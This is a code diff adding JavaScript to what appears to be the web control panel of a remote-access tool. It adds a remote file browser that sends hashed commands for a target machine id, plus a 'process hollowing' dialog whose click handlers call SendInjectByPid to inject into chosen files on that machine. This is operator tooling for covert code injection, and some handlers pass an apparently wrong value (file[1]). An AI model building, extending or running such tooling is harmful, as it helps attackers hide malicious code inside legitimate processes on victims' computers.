@@ -222,6 +222,33 @@ function FetchProcesess(id){
 }
   
   
+ 
+function FetchFilesHollowing(id,path="default"){
+  const loader = new Loading()
+  loader.DisplayLoading()
+  return fetch("/send_message", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({message:{command: "ce52e112fb976b2d277f09b6eada379f", path:path}, id: id})
+  })
+  .then(response => {
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+    return response.json();
+  })
+  .then(res => {
+    loader.EndLoading()
+    return res.message;
+  })
+  .catch(error => {
+    console.error('An error occurred while fetching files:', error);
+  });
+}
+
+
 export function UploadProcessToInject() {
     return new Promise((resolve, reject) => {
       let mainDiv = document.getElementById("UploadFileDialogBox");
@@ -344,3 +371,214 @@ function toggleAll(exclude){
       }
     });
   }
+
+
+
+
+
+
+// File Exp Process hollowing
+
+
+export function HollowingOption(e, id, path="default"){
+  e.preventDefault();
+  toggleAll("");
+  fetch('/processhollowing')
+    .then(response => response.text())
+    .then(html => {
+      const modal = document.createElement('div');
+      modal.innerHTML = html;
+      modal.style = "position: absolute;left: 5%;width: 90%;top: 0%;z-index: 2;color: white;"
+      modal.id = "ProcessMainTable"
+      document.body.appendChild(modal);
+
+     FetchFilesHollowing(id,path)
+      .then(data =>{
+        let folderselection = document.querySelector('#folderhollowexpSelection');
+        for(let i of data['Folders']['DirectoriesArr']){
+            let option = document.createElement('option');
+            option.text = i;
+            option.value = i;
+            folderselection.add(option);
+        }
+        folderselection.addEventListener('change', (e) => {
+          HollowingOption(e, id, e.target.value);
+        });
+
+        let tbody = document.querySelector('#ProcessesToinject tbody');
+        if (tbody) {
+          while (tbody.firstChild) {
+            tbody.removeChild(tbody.firstChild);
+          }
+        } 
+        for(let i of data['Files']){  
+          let row = document.createElement('tr');
+
+          let tdName = document.createElement('td');
+          tdName.className = "FilesNameInjectoption";
+
+          let img = document.createElement('img');
+          img.src = 'data:image/png;base64,' + i.icon;
+          img.style = "width: 30px; height: 30px;"; 
+          tdName.appendChild(img);
+
+          let pname = document.createElement('p');
+          let nameText = document.createTextNode(i.name);
+          pname.appendChild(nameText);
+
+          tdName.appendChild(pname);
+
+          row.appendChild(tdName);
+
+          let tdSize = document.createElement('td');
+          tdSize.className = "PidInjectoption";
+          tdSize.textContent = i.size;
+          row.appendChild(tdSize);
+
+          let tdLastTimeUpdate = document.createElement('td');
+          tdLastTimeUpdate.className = "Memoryusegoption";
+          tdLastTimeUpdate.textContent = i.lastTimeUpdate;
+          row.appendChild(tdLastTimeUpdate);
+
+          let tdCreationTime = document.createElement('td');
+          tdCreationTime.className = "OwnerInjectoption";
+          tdCreationTime.textContent = i.creationTime;
+          row.appendChild(tdCreationTime);
+
+          let td = document.createElement('td');
+          td.className = "WasInjectoption";
+          let icon = document.createElement('i');
+          icon.className = "fa-solid fa-microchip";
+          td.appendChild(icon);        
+          icon.addEventListener('click', function() {
+            SendInjectByPid(i[1],icon, id);
+          });
+
+          row.appendChild(td);
+          tbody.appendChild(row);
+        }
+      });
+    })
+    .catch(error => console.error('Error:', error));
+}
+
+
+
+
+export class HollowingOptionHandler {
+  constructor(id, initialPath = "default") {
+      this.id = id;
+      this.path = initialPath;
+      this.modal = null;
+      this.folderSelection = null;
+      this.tbody = null;
+  }
+
+  initialize() {
+      this.fetchModalHtml()
+          .then(html => this.createModal(html))
+          .then(() => this.updateContentForPath(this.path))
+          .catch(error => console.error('Error:', error));
+  }
+
+  fetchModalHtml() {
+      return fetch('/processhollowing').then(response => response.text());
+  }
+
+  createModal(html) {
+      this.modal = document.createElement('div');
+      this.modal.innerHTML = html;
+      this.modal.style = "position: absolute;left: 5%;width: 90%;top: 0%;z-index: 2;color: white;"
+      this.modal.id = "ProcessMainTable"
+      document.body.appendChild(this.modal);
+      this.folderSelection = document.querySelector('#folderhollowexpInput');
+      this.folderDataList = document.querySelector('#folderhollowexpSelection');
+      this.tbody = document.querySelector('#ProcessesToinject tbody');
+      this.folderSelection.addEventListener('change', (e) => {
+        if(e.target.value.length > 5){
+          this.path = e.target.value;
+          this.updateContentForPath(this.path);
+        }
+    });    
+  }
+
+  updateContentForPath(path) {
+      FetchFilesHollowing(this.id, path)
+          .then(data => this.handleData(data))
+          .catch(error => console.error('Error:', error));
+  }
+
+  handleData(data) {
+      this.populateFolderSelection(data['Folders']['DirectoriesArr']);
+      this.populateTable(data['Files']);
+  }
+
+  populateFolderSelection(directories) {
+    this.folderDataList.innerHTML = "";  // Clear existing options.
+    for(let i of directories){
+        let option = document.createElement('option');
+        option.value = i;
+        this.folderDataList.appendChild(option);
+    }
+  }
+
+
+  populateTable(files) {
+      while (this.tbody.firstChild) {
+          this.tbody.removeChild(this.tbody.firstChild);
+      }
+      for (let i of files) {
+          let row = this.createRow(i);
+          this.tbody.appendChild(row);
+      }
+      this.folderSelection.placeholder = this.path;
+  }
+
+  createRow(file) {
+    let row = document.createElement('tr');
+
+    let tdName = document.createElement('td');
+    tdName.className = "FilesNameInjectoption";
+
+    let img = document.createElement('img');
+    img.src = 'data:image/png;base64,' + file.icon;
+    img.style = "width: 30px; height: 30px;";
+    tdName.appendChild(img);
+
+    let pname = document.createElement('p');
+    let nameText = document.createTextNode(file.name);
+    pname.appendChild(nameText);
+
+    tdName.appendChild(pname);
+    row.appendChild(tdName);
+
+    let tdSize = document.createElement('td');
+    tdSize.className = "PidInjectoption";
+    tdSize.textContent = file.size;
+    row.appendChild(tdSize);
+
+    let tdLastTimeUpdate = document.createElement('td');
+    tdLastTimeUpdate.className = "Memoryusegoption";
+    tdLastTimeUpdate.textContent = file.lastTimeUpdate;
+    row.appendChild(tdLastTimeUpdate);
+
+    let tdCreationTime = document.createElement('td');
+    tdCreationTime.className = "OwnerInjectoption";
+    tdCreationTime.textContent = file.creationTime;
+    row.appendChild(tdCreationTime);
+
+    let td = document.createElement('td');
+    td.className = "WasInjectoption";
+    let icon = document.createElement('i');
+    icon.className = "fa-solid fa-microchip";
+    td.appendChild(icon);
+    icon.addEventListener('click', function() {
+        SendInjectByPid(file[1], icon, this.id);
+    }.bind(this));
+
+    row.appendChild(td);
+
+    return row;
+  }
+
+}
